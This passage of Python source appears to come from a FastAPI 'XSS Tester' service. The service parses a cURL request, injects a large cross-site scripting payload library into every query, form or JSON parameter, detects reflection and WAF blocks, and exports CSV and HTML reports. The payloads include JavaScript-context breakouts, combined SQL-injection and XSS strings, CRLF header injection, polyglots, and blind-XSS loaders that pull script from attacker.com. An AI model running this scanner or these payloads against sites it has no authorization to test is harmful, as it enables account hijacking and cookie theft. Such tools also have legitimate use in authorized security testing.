    add("exotic_tags", [
        "<xss onmouseover=alert(1)>hover</xss>","<custom-element onmouseover=alert(1)>",
        "<bdo onmouseover=alert(1)>","<abbr onmouseover=alert(1)>","<article onmouseover=alert(1)>",
        "<aside onmouseover=alert(1)>","<caption onmouseover=alert(1)>",
        "<fieldset onmouseover=alert(1)>","<footer onmouseover=alert(1)>",
        "<header onmouseover=alert(1)>","<legend onmouseover=alert(1)>",
        "<main onmouseover=alert(1)>","<mark onmouseover=alert(1)>",
        "<nav onmouseover=alert(1)>","<section onmouseover=alert(1)>",
        "<summary onmouseover=alert(1)>","<layer onmouseover=alert(1)>",
        "<link onload=alert(1) rel=stylesheet href=data:text/css,>",
        "<img is=x onerror=alert(1) src=x>",
    ])
    add("js_context", [
        "';alert(1)//","\";alert(1)//","`;alert(1)//","');alert(1)//","\");alert(1)//",
        "'-alert(1)-'","\"-alert(1)-\"","`-alert(1)-`","\\x27;alert(1)//","\\x22;alert(1)//",
        "</script><script>alert(1)//","</script><img src=x onerror=alert(1)>",
        "%27;alert(1)//","%22;alert(1)//","/*</script>*/alert(1)//","*/ alert(1); /*",
        "}}alert(1)//","}catch(e){alert(1)}//","if(1){alert(1)}","&&alert(1)//",
        "||alert(1)//","+alert(1)+","//</script>\n<img src=x onerror=alert(1)>",
    ])
    add("blind_xss", [
        "<script src=//attacker.com/xss.js></script>",
        "\"><script src=//attacker.com/xss.js></script>",
        "';var s=document.createElement('script');s.src='//attacker.com/xss.js';document.head.append(s);//",
        "<img src=x onerror=\"var s=document.createElement('script');s.src='//attacker.com/xss.js';document.head.append(s)\">",
        "<svg/onload=\"var s=document.createElement('script');s.src='//attacker.com/xss.js';document.head.append(s)\">",
    ])
    add("hybrid_injection", [
        "' OR 1=1--\"><script>alert(1)</script>","UNION SELECT null,null,null--\"><img src=x onerror=alert(1)>",
        "' UNION SELECT '<script>alert(1)</script>',null,null--",
        "{{7*7}}\"><script>alert(1)</script>","${7*7}\"><script>alert(1)</script>",
        "a;alert(1)//","test\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
    ])
    add("self_xss", [
        "javascript:alert(document.cookie)//",
        "javascript:void(document.body.innerHTML='<img src=x onerror=alert(1)>')",
        "javascript:eval('alert(1)')","javascript:(function(){alert(1)})()",
        "javascript:alert(window.location.href)","javascript:alert(document.title)",
    ])
    add("polyglot_advanced", [
        "javascript://comment%0aalert(1)","javascript://comment%0d%0aalert(1)",
        "<script>/*<![CDATA[*/alert(1)/*]]>*/</script>",
        "<img onerror=&NewLine;alert(1)&NewLine; src=x>",
        "<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>click</a>",
        "<a href=javascript&colon;alert(1)>click</a>","\"><svg><script>alert(1)</script></svg>",
        "<img src=x onerror=location='javascript:alert(1)'>","'><svg/onload=alert(1)>",
        "\"'><script>alert(1)</script>","</script></title></style><img src=x onerror=alert(1)>",
        "<object/data=javascript:alert(1)>","<embed/src=javascript:alert(1)>",
        "<!--><svg/onload=alert(1)>","<svg xmlns=http://www.w3.org/2000/svg onload=alert(1)>",
        "</noscript></noscript><script>alert(1)</script>",
    ])

    seen, unique = set(), []
    for cat, p in lib:
        if p not in seen: seen.add(p); unique.append((cat, p))
    return unique


# ─── cURL parser ──────────────────────────────────────────────────────────────

def _parse_curl(curl: str):
    method, headers, data, cookies = "GET", {}, None, {}

    m = re.search(r"(https?://[^\s'\"\\]+)", curl)
    if not m:
        raise ValueError("No URL found in cURL")
    url = m.group(1)

    mx = re.search(r"-X\s+(\w+)", curl)
    if mx: method = mx.group(1).upper()

    for h in re.findall(r"-H\s+'([^']+)'", curl):
        if ":" in h:
            k, v = h.split(":", 1)
            k, v = k.strip(), v.strip()
            if k.lower() == "cookie":
                for ck in v.split(";"):
                    ck = ck.strip()
                    if "=" in ck:
                        ck_k, ck_v = ck.split("=", 1)
                        cookies[ck_k.strip()] = ck_v.strip()
            else:
                headers[k] = v

    for cb in re.findall(r"(?:-b|--cookie)\s+'([^']*)'", curl):
        for ck in cb.split(";"):
            ck = ck.strip()
            if "=" in ck:
                ck_k, ck_v = ck.split("=", 1)
                cookies[ck_k.strip()] = ck_v.strip()

    # Handle ANSI-C $'...' quoting (browser DevTools) AND plain '...'
    if "--data-raw $'" in curl:
        start = curl.find("--data-raw $'") + len("--data-raw $'")
        dm2 = re.search(r"((?:[^'\\]|\\.)*)'", curl[start:], re.DOTALL)
        if dm2:
            data = dm2.group(1).replace("\\'", "'").replace("\\\\", "\\")
            if not mx: method = "POST"
    else:
        dm = re.search(r"--data(?:-raw)?\s+'([^']+)'", curl, re.DOTALL)
        if dm:
            data = dm.group(1)
            if not mx: method = "POST"

    return method, url, headers, data, cookies


def _discover_params(url, data, headers):
    params = {"query": [], "body": []}
    body_type = None
    json_body = None

    parsed = urlparse(url)
    if parsed.query:
        params["query"] = list(parse_qs(parsed.query, keep_blank_values=True).keys())

    if data:
        ct = headers.get("content-type", headers.get("Content-Type", "")).lower()
        if "application/json" in ct or data.strip().startswith("{"):
            try:
                json_body = json.loads(data)
                body_type = "json"
                def _keys(obj, prefix=""):
                    out = []
                    if isinstance(obj, dict):
                        for k, v in obj.items():
                            full = f"{prefix}.{k}" if prefix else k
                            if isinstance(v, (dict, list)): out += _keys(v, full)
                            else: out.append(full)
                    elif isinstance(obj, list):
                        for i, v in enumerate(obj): out += _keys(v, f"{prefix}[{i}]")
                    return out
                params["body"] = _keys(json_body)
            except Exception:
                body_type = "form"
        else:
            body_type = "form"
            for part in data.split("&"):
                if "=" in part: params["body"].append(part.split("=", 1)[0])

    return params, body_type, json_body


# ─── Injection helpers ────────────────────────────────────────────────────────

def _inject_query(url, param, payload):
    parsed = urlparse(url)
    parts, found = [], False
    for part in parsed.query.split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
            if k == param:
                parts.append(f"{k}={payload}"); found = True; continue
        parts.append(part)
    if not found: parts.append(f"{param}={payload}")
    return urlunparse(parsed._replace(query="&".join(parts)))


def _inject_body(data, param, payload):
    if not data: return f"{param}={payload}"
    parts, found = [], False
    for part in data.split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
            if k == param:
                parts.append(f"{k}={payload}"); found = True; continue
        parts.append(part)
    if not found: parts.append(f"{param}={payload}")
    return "&".join(parts)


def _inject_json(json_body, dotted_key, payload, random_formats=None):
    body = copy.deepcopy(json_body)
    if random_formats:
        for fk, fv in random_formats.items():
            rv = _rand_val(fv)
            fp = re.split(r'\.(?![^\[]*\])', fk)
            obj = body
            for part in fp[:-1]:
                mm = re.match(r'^(.*)\[(\d+)\]$', part)
                if mm: obj = obj[mm.group(1)][int(mm.group(2))]
                elif isinstance(obj, dict) and part in obj: obj = obj[part]
            last = fp[-1]
            if isinstance(obj, dict) and last in obj: obj[last] = rv
    parts = re.split(r'\.(?![^\[]*\])', dotted_key)
    obj = body
    for part in parts[:-1]:
        mm = re.match(r'^(.*)\[(\d+)\]$', part)
        if mm: obj = obj[mm.group(1)][int(mm.group(2))]
        elif isinstance(obj, dict) and part in obj: obj = obj[part]
        else: break
    else:
        last = parts[-1]
        mm = re.match(r'^(.*)\[(\d+)\]$', last)
        if mm: obj[mm.group(1)][int(mm.group(2))] = payload
        elif isinstance(obj, dict): obj[last] = payload
    return json.dumps(body)


# ─── Detection ────────────────────────────────────────────────────────────────

REFLECT_PATS = [
    re.compile(r"<script[\s>]", re.I), re.compile(r"</script>", re.I),
    re.compile(r"on(load|error|click|focus|mouse\w+|key\w+)\s*=", re.I),
    re.compile(r"javascript\s*:", re.I), re.compile(r"<svg[\s/>]", re.I),
    re.compile(r"<img\s[^>]*onerror", re.I), re.compile(r"<iframe[\s>]", re.I),
    re.compile(r"alert\s*\(", re.I),
]
WAF_CODES = {403, 406, 429}
WAF_WORDS = ["blocked","forbidden","access denied","waf","firewall","attack detected","security violation"]

DANGEROUS_PARTS = [
    "onerror=alert","onload=alert","onfocus=alert","onerror=alert(1)",
    "</script>","<script>","javascript:alert","alert(document.cookie)",
    "alert(document.domain)","alert(1)","onmouseover=alert","svg/onload",
]

def _is_waf(resp):
    if resp.status_code in WAF_CODES: return True
    try: return any(k in resp.text[:2000].lower() for k in WAF_WORDS)
    except: return False

def _guess_ctx(body, fragment):
    idx = body.lower().find(fragment.lower())
    if idx == -1: return "unknown"
    snip = body[max(0, idx-80): idx+80].lower()
    if "<script" in snip or "javascript" in snip: return "js_context"
    if "style=" in snip or "<style" in snip: return "css_context"
    if re.search(r'<\w+\s[^>]*=\s*["\']?$', snip[:80]): return "attr_context"
    return "html_context"

def _detect(resp, marked_payload):
    if _is_waf(resp): return False, "waf_block", "blocked"
    try: body = resp.text
    except: return False, "read_error", "unknown"
    if MARKER in body:
        esc = _html.escape(MARKER)
        reason = "marker_raw_reflect" if esc not in body else "marker_escaped_reflect"
        return True, reason, _guess_ctx(body, MARKER)
    for part in DANGEROUS_PARTS:
        if part.lower() in body.lower():
            return True, f"payload_part_reflected:{part}", _guess_ctx(body, part)
    for pat in REFLECT_PATS:
        mm = pat.search(body)
        if mm: return True, f"pattern_match:{mm.group(0)[:40]}", _guess_ctx(body, mm.group(0))
    return False, "clean", "none"


# ─── Scan worker ──────────────────────────────────────────────────────────────

def _scan_worker(job_id: str):
    job = JOBS[job_id]
    try:
        curl = job["curl"]
        method, url, headers, data, cookies = _parse_curl(curl)
        _, body_type, json_body = _discover_params(url, data, headers)
        selected = job["selected_params"]     # list of {location, name}
        rnd_fmt  = job["random_formats"]      # dict name→format
        scan_type = job["scan_type"]
        delay    = job["delay"]

        payloads = _build_quick() if scan_type == "quick" else _build_full()

        tasks = []
        idx = 1
        for p in selected:
            for cat, payload in payloads:
                marked = payload.replace("alert(1)", f"alert('{MARKER}')", 1)
                if MARKER not in marked: marked = payload + f"<!-- {MARKER} -->"
                tasks.append((idx, p["location"], p["name"], cat, payload, marked))
                idx += 1

        job["total"] = len(tasks)
        job["status"] = "running"

        for task in tasks:
            if job.get("stop"): break
            g_idx, loc, pname, cat, raw_pl, marked = task
            sent_body = ""
            try:
                if loc == "query":
                    test_url  = _inject_query(url, pname, marked)
                    test_data = data; test_json = None; sent_body = data or ""
                elif body_type == "json":
                    test_url  = url; test_data = None
                    test_json = _inject_json(json_body, pname, marked, rnd_fmt)
                    sent_body = test_json
                else:
                    test_url  = url; test_data = _inject_body(data, pname, marked)
                    test_json = None; sent_body = test_data

                resp = _req.request(
                    method, test_url, headers=headers, cookies=cookies,
                    data=test_json if test_json is not None else test_data,
                    timeout=TIMEOUT, verify=VERIFY
                )
                confirmed, reason, ctx = _detect(resp, marked)
                try: resp_body = resp.text
                except: resp_body = ""
                status = resp.status_code

                r = {
                    "idx": g_idx, "param": pname, "location": loc,
                    "category": cat, "payload": raw_pl, "status": status,
                    "confirmed": confirmed, "reason": reason, "context": ctx,
                    "sent_body": sent_body, "response_body": resp_body,
                }

                job["results"].append(r)
                job["completed"] += 1
                job["elapsed"] = round(time.time() - job["start_ts"], 1)

                # Live feed entry (keep last 60)
                dot = "🔴" if confirmed else ("🟡" if reason == "waf_block" else "🟢")
                feed_entry = {
                    "idx": g_idx, "param": pname, "cat": cat,
                    "status": status, "confirmed": confirmed, "reason": reason,
                    "dot": dot, "payload_short": raw_pl[:60],
                }
                job["feed"].append(feed_entry)
                if len(job["feed"]) > 60: job["feed"].pop(0)

                # Stop on 401 mid-scan
                if status == 401:
                    job["stop_reason"] = "401_unauthorized"
                    break

            except Exception as ex:
                job["results"].append({
                    "idx": g_idx, "param": pname, "location": loc,
                    "category": cat, "payload": raw_pl, "status": "ERROR",
                    "confirmed": False, "reason": str(ex)[:60], "context": "none",
                    "sent_body": sent_body, "response_body": str(ex),
                })
                job["completed"] += 1

            if delay > 0: time.sleep(delay)

        job["status"] = "done"
        job["elapsed"] = round(time.time() - job["start_ts"], 1)

    except Exception as e:
        job["status"] = "error"
        job["error"] = str(e)


# ─── API models ───────────────────────────────────────────────────────────────

class ParseReq(BaseModel):
    curl: str

class ScanReq(BaseModel):
    curl: str
    selected_params: List[Dict]
    random_formats: Optional[Dict[str, str]] = {}
    scan_type: str = "quick"
    delay: Optional[float] = 0.3


# ─── Endpoints ────────────────────────────────────────────────────────────────

@app.get("/")
def root(): return {"status": "ok", "service": "XSS Tester"}

@app.post("/xss/parse")
def xss_parse(req: ParseReq):
    try:
        method, url, headers, data, cookies = _parse_curl(req.curl)
        params, body_type, _ = _discover_params(url, data, headers)
        flat = []
        for loc in ("query", "body"):
            for name in params[loc]:
                flat.append({"location": loc, "name": name})
        return {
            "ok": True, "url": url, "method": method,
            "body_type": body_type, "params": flat,
            "header_count": len(headers),
        }
    except Exception as e:
        from fastapi import HTTPException
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/xss/scan/start")
def xss_scan_start(req: ScanReq):
    jid = str(uuid.uuid4())[:8]
    JOBS[jid] = {
        "curl": req.curl, "selected_params": req.selected_params,
        "random_formats": req.random_formats or {},
        "scan_type": req.scan_type, "delay": req.delay,
        "status": "pending", "total": 0, "completed": 0,
        "results": [], "feed": [], "start_ts": time.time(),
        "elapsed": 0, "stop": False, "stop_reason": None, "error": None,
    }
    t = threading.Thread(target=_scan_worker, args=(jid,), daemon=True)
    t.start()
    return {"job_id": jid}

@app.get("/xss/scan/progress/{job_id}")
def xss_progress(job_id: str):
    from fastapi import HTTPException
    job = JOBS.get(job_id)
    if not job: raise HTTPException(status_code=404, detail="Job not found")
    xss = sum(1 for r in job["results"] if r["confirmed"])
    waf = sum(1 for r in job["results"] if r["reason"] == "waf_block")
    pct = round((job["completed"] / job["total"]) * 100, 1) if job["total"] else 0
    return {
        "status": job["status"], "progress": pct,
        "completed": job["completed"], "total": job["total"],
        "elapsed": job["elapsed"], "xss_count": xss, "waf_count": waf,
        "feed": job["feed"][-20:],
        "results": job["results"],
        "error": job.get("error"),
        "stop_reason": job.get("stop_reason"),
    }

@app.post("/xss/scan/stop/{job_id}")
def xss_stop(job_id: str):
    job = JOBS.get(job_id)
    if job: job["stop"] = True
    return {"ok": True}

@app.get("/xss/export/csv/{job_id}")
def xss_csv(job_id: str):
    from fastapi import HTTPException
    job = JOBS.get(job_id)
    if not job: raise HTTPException(404, "Job not found")
    buf = io.StringIO()
    w = csv.writer(buf, quoting=csv.QUOTE_ALL)
    w.writerow(["#","Param","Location","Category","Payload","Status","Confirmed","Reason","Context","Request Sent","Response Body"])
    for r in job["results"]:
        w.writerow([r["idx"],r["param"],r["location"],r["category"],r["payload"],
                    r["status"],r["confirmed"],r["reason"],r["context"],
                    (r.get("sent_body") or "")[:500],(r.get("response_body") or "")[:500]])
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    return {"csv": buf.getvalue(), "filename": f"xss_scan_{ts}.csv"}

@app.get("/xss/export/html/{job_id}")
def xss_html_report(job_id: str):
    from fastapi import HTTPException
    job = JOBS.get(job_id)
    if not job: raise HTTPException(404, "Job not found")
    results = job["results"]
    confirmed = [r for r in results if r["confirmed"]]
    blocked   = [r for r in results if r["reason"] == "waf_block"]

    def _badge(code):
        try:
            c = int(code)
            col = "#238636" if 200<=c<300 else "#1f6feb" if 300<=c<400 else "#d29922" if 400<=c<500 else "#f85149"
        except: col = "#6e7681"
        return f"<span style='background:{col};color:#fff;border-radius:4px;padding:2px 7px;font-size:11px;font-weight:bold'>{code}</span>"

    rows = ""
    for r in results:
        if r["confirmed"]:     badge = "<span class='v'>XSS</span>"; rc = "c"
        elif r["reason"]=="waf_block": badge = "<span class='b'>BLOCKED</span>"; rc = "b"
        elif r["status"]=="ERROR": badge = "<span class='e'>ERROR</span>"; rc = ""
        else: badge = "<span class='s'>CLEAN</span>"; rc = ""
        rows += f"<tr class='{rc}'><td>{r['idx']}</td><td>{_html.escape(r['param'])}</td><td>{_html.escape(r['category'])}</td><td><code>{_html.escape(r['payload'])}</code></td><td>{_badge(r['status'])}</td><td>{badge}</td><td style='color:#e3b341;font-size:11px'>{r['context']}</td><td><code style='font-size:10px;color:#8b949e'>{_html.escape((r.get('response_body') or '')[:120])}</code></td></tr>"

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    htm = f"""<!DOCTYPE html><html><head><meta charset='utf-8'><title>XSS Report</title>
<style>body{{font-family:Arial,sans-serif;background:#0d1117;color:#c9d1d9;margin:20px}}
h1{{color:#f85149}}h2{{color:#c9d1d9;background:#161b22;padding:8px 12px;border-left:4px solid #f85149;margin-top:20px}}
table{{border-collapse:collapse;width:100%;font-size:12px}}
th{{background:#161b22;color:#c9d1d9;padding:7px 9px;text-align:left;border-bottom:2px solid #30363d}}
td{{padding:5px 9px;border-bottom:1px solid #21262d;word-break:break-all}}
tr.c{{background:#1a0a0a}}tr.b{{background:#0d0d1a}}tr:hover{{background:#1c2128}}
code{{background:#161b22;padding:2px 4px;border-radius:3px;font-size:11px}}
.cards{{display:flex;gap:12px;margin:14px 0}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 20px;text-align:center}}
.card h3{{margin:0;font-size:24px}}.card p{{margin:4px 0 0;font-size:11px;color:#8b949e}}
.red{{color:#f85149}}.blue{{color:#58a6ff}}.grey{{color:#6e7681}}
.v{{background:#f85149;color:#fff;border-radius:3px;padding:1px 6px;font-size:10px;font-weight:bold}}
.b{{background:#6e7681;color:#fff;border-radius:3px;padding:1px 6px;font-size:10px;font-weight:bold}}
.s{{background:#1f6feb;color:#fff;border-radius:3px;padding:1px 6px;font-size:10px;font-weight:bold}}
.e{{background:#d29922;color:#fff;border-radius:3px;padding:1px 6px;font-size:10px;font-weight:bold}}
</style></head><body>
<h1>🎯 XSS Vulnerability Report</h1>
<p style='color:#8b949e;font-size:13px'>Scan type: <b>{_html.escape(job['scan_type'])}</b> &nbsp;|&nbsp; {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<div class='cards'>
  <div class='card'><h3 class='red'>{len(confirmed)}</h3><p>Confirmed XSS</p></div>
  <div class='card'><h3 class='grey'>{len(blocked)}</h3><p>WAF Blocked</p></div>
  <div class='card'><h3 class='blue'>{len(results)-len(confirmed)-len(blocked)}</h3><p>Clean</p></div>
  <div class='card'><h3>{len(results)}</h3><p>Total Tests</p></div>
</div>
<h2>All Results</h2>
<table><tr><th>#</th><th>Param</th><th>Category</th><th>Payload</th><th>Status</th><th>Result</th><th>Context</th><th>Response</th></tr>
{rows}</table></body></html>"""
    return {"html": htm, "filename": f"xss_scan_{ts}.html"}
